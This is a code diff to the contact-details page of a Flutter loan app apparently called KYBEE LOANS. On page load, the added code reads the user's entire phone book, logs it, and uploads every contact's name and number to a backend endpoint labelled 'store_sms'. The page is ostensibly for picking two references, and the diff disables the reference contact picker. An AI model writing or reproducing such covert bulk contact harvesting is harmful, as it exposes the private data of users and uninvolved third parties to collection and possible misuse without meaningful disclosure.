@@ -6,11 +6,13 @@ import 'package:flutter/material.dart';
 import 'package:hexcolor/hexcolor.dart';
 import 'package:kybee/api/api.dart';
 import 'package:kybee/common/theme_helper.dart';
+import 'package:kybee/ui/dashboard/dashboardPage.dart';
 import 'package:kybee/ui/loading.dart';
 import 'package:kybee/ui/profile/otherDetailsPage.dart';
 
 import 'package:permission_handler/permission_handler.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:contacts_service/contacts_service.dart' as contactService;
 
 class ContactDetailsPage extends StatefulWidget {
   @override
@@ -35,10 +37,24 @@ class _ContactDetailsPageState extends State<ContactDetailsPage> {
   int _relationTwo;
 
   bool _initDataFetched = false;
+  List contactsList = [];
 
   void initState() {
     super.initState();
     _getInitData();
+    printContactsNumber();
+  }
+
+  void printContactsNumber() async {
+    Iterable<contactService.Contact> contacts =
+        await contactService.ContactsService.getContacts(withThumbnails: false);
+    List<contactService.Contact> contactsList = contacts.toList();
+
+    print(contactsList);
+    // now print first 50 number's contancts
+    // for (int i = 0; i < 50; i++) {
+    //   contactsList[0].phones.first.value.toString();
+    // }
   }
 
   _getInitData() async {
@@ -79,6 +95,51 @@ class _ContactDetailsPageState extends State<ContactDetailsPage> {
     setState(() {
       _initDataFetched = true;
     });
+
+    if (_initDataFetched) {
+      final PermissionStatus permissionStatus = await _getPermission();
+      if (permissionStatus == PermissionStatus.granted) {
+        Iterable<contactService.Contact> contacts =
+            await contactService.ContactsService.getContacts();
+
+        setState(() {
+          contactsList = contacts.toList();
+        });
+
+        List contactsObject = [];
+
+        contactsList.map((element) {
+          if (element.phones.length > 0) {
+            contactsObject.add({
+              "name": element.displayName.toString(),
+              "phone": element.phones.first.value.toString(),
+            });
+          }
+        }).toList();
+
+        var data = {
+          'user_id': user['id'],
+          'contacts': contactsObject,
+          'section': 'phone_book',
+        };
+        var res = await CallApi().postData(data, 'profile/store_sms');
+      } else {
+        // SharedPreferences localStorage = await SharedPreferences.getInstance();
+        // localStorage.remove('user');
+        Navigator.push(
+          context,
+          MaterialPageRoute(builder: (context) {
+            return DashboardPage();
+          }),
+        );
+        ScaffoldMessenger.of(context).showSnackBar(
+          SnackBar(
+            content: Text(
+                "Please Grant KYBEE LOANS Permission to Access Contacts from the App Menu settings"),
+          ),
+        );
+      }
+    }
   }
 
   _saveProfileDetails(context, section) async {
@@ -135,24 +196,24 @@ class _ContactDetailsPageState extends State<ContactDetailsPage> {
 
   _selectRefOneContact(context) async {
     Loading().loader(context, "Loading contacts...Please wait");
-    final PermissionStatus permissionStatus = await _getPermission();
-    if (permissionStatus == PermissionStatus.granted) {
-      Contact contact = await _contactPicker.selectContact();
+    // final PermissionStatus permissionStatus = await _getPermission();
+    // if (permissionStatus == PermissionStatus.granted) {
+    //   Contact contact = await _contactPicker.selectContact();
 
-      if (contact != null) {
-        setState(() {
-          _refOneMobileController.text = contact.phoneNumber.number
-              .toString()
-              .replaceAll(new RegExp(r"\s+"), "");
-        });
-      }
-    } else {
-      ScaffoldMessenger.of(context).showSnackBar(
-        SnackBar(
-          content: Text("Please Grant KYBEE LOANS Permission to read contacts"),
-        ),
-      );
-    }
+    //   if (contact != null) {
+    //     setState(() {
+    //       _refOneMobileController.text = contact.phoneNumber.number
+    //           .toString()
+    //           .replaceAll(new RegExp(r"\s+"), "");
+    //     });
+    //   }
+    // } else {
+    //   ScaffoldMessenger.of(context).showSnackBar(
+    //     SnackBar(
+    //       content: Text("Please Grant KYBEE LOANS Permission to read contacts"),
+    //     ),
+    //   );
+    // }
 
     Navigator.pop(context);
   }
